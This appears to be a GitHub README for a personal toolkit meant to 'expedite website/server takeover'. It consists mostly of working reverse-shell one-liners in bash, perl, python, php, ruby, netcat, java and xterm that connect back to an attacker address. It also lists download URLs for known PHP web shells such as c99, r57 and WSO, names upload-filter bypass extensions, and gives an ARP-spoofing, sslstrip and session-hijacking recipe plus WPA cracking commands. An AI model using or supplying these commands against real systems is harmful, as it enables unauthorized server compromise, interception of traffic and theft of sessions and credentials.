# MyHackingToolkit

A set of shells to expedite website/server takeover, I will build this repo for my own use, if you believe you can use it and want to enhance, please create a pull-request or suggest enhancements to current scripts

## Reverse Shell

- [PentestMonkey.net](http://pentestmonkey.net/)

### Bash

Some versions of bash [can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### PERL

Here’s a shorter, feature-free version of the perl-reverse-shell:

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

There’s also an alternative PERL revere shell [here](http://www.plenz.com/reverseshell).

### Python

This was tested under Linux / Python 2.7:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

```bash
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

```xterm
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

```xterm
Xnest :1
```

You’ll need to authorise the target to connect to you (command also run on your host):

[Bernardo’s Reverse Shell One-Liners](http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html)

## PHP

- a small script with wget command for file uploaders with different extensions .jpg.php .jpg;.php .phtml .php3 .php4 .php5
- a small script to download from github repo the main shells required for takeover testing
- symlinking scripts
- mysql pure shell
- vbulletin plugin or style
- wordpress theme
- wordpress plugin
- backconnect

```json
[
'http://www.c99shellphp.com/shell/angel.txt',
'http://www.c99shellphp.com/shell/r57.txt',
'http://www.c99shellphp.com/shell/c100.txt',
'http://www.c99shellphp.com/shell/kacak.txt',
'http://www.c99shellphp.com/shell/symlink.txt',
'http://www.c99shellphp.com/shell/h4cker.tr.txt',
'http://www.c99shellphp.com/shell/bv7binary.txt',
'http://www.c99shellphp.com/shell/webadmin.txt',
'http://www.c99shellphp.com/shell/gazashell.txt',
'http://www.c99shellphp.com/shell/locus7shell.txt',
'http://www.c99shellphp.com/shell/ernebypass.txt',
'http://www.c99shellphp.com/shell/g6shell.txt',
'http://www.c99shellphp.com/shell/uploadshell_hima.txt',
'http://www.c99shellphp.com/shell/wsoshell.txt',
'http://www.c99shellphp.com/shell/commandshell.txt'
]
```

## Perl

- cgi script
- cgi backconnect

# python shell

## .htaccess CheatSheet

# Hack with Hamster & Ferret

```bash
wget http://www.erratasec.com/erratasec.zip
unzip erratasec.zip
cp -R ferret/ /pentest/exploits/ && cp -R hamster/ /pentest/exploits/
cd /pentest/exploits/hamster/build/gcc4/ && make
cd /pentest/exploits/ferret/build/gcc4/ && make
cp /pentest/exploits/ferret/bin/ferret /pentest/exploits/hamster/bin
cd /pentest/exploits/hamster/bin/ && ./hamster
# Start Firefox
# Edit -> Preferences
# Advanced Tab -> Network Tab
# Click on Settings
# Select Manual proxy configuration
# Set the HTTP Proxy: 127.0.0.1 on Port: 1234
# Tick Use this proxy server for all protocols and click ok
```

```bash
ttercap -T -Q -M arp:remote -i wlan0 /victim IP/ /gateway_IP/ -P remote_browser
echo "1" > /proc/sys/net/ipv4/ip_forward

# the -T starts it in text mode.
# the  -Q will make ettercap be superQuiet (not print raw packets in the terminal window)
# the  -M starts man in the middle mode, and the arp:remote is the type of poisoning, and remote is a parameter for MITM.  these commands can be # combined into one switch like -TQM  but for clarity i put them separately.
# NOTE: the victim IP must be in the same subnet as your PC.

# p
# then
# gw_discover
# to give you the gateway in ettercap

# to scan IPs on the network
nmap -sP 10.10.10.*

arpspoof -i wlan0 -t target_IP GATEWAY_IP

sniff ssl

configure /etc/etter.conf
privs 0 0

redir_command_on/off
under linux
redir_command_on un commented with off
ip_forward 1

arpspoof -i wlan0 -t target_IP GATEWAY_IP
# If you want to poison multiple targets just leave the “-t” out of the arpspoof command  and leave the gateway

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
urlsnarf -i wlan0|cut -d\" -f4

sslstrip -a -k -f
ettercap -T -q -i wlan0

reset iptables
iptables –flush/ iptables -F

./ferret -i eth0  
./hamster  

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.104 192.168.1.1

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
sslstrip -p -k -f

/pentest/sniffers/hamster/ferret -i eth0

/pentest/sniffers/hamster/hamster

# Konqueror -> Settings -> Configure Konqueror -> Proxy -> Manually. 127.0.0.1:1234
# Konqueror -> http://hamster

# root@bt:/pentest/web/sslstrip# python sslstrip -a -k


# WPA without dictionary
# / pentest / passwords / crunch /. / crunch 9 9 | aircrack-ng -b (BSSID) -w - / root/.gerix-wifi-cracker/sniff_dump- *. cap
# / pentest / passwords / crunch /. / Crunch 9 9 KIULO56UH | aircrack-ng-b (BSSID)-w - / root/.gerix-wifi-cracker/sniff_dump- *. cap
```
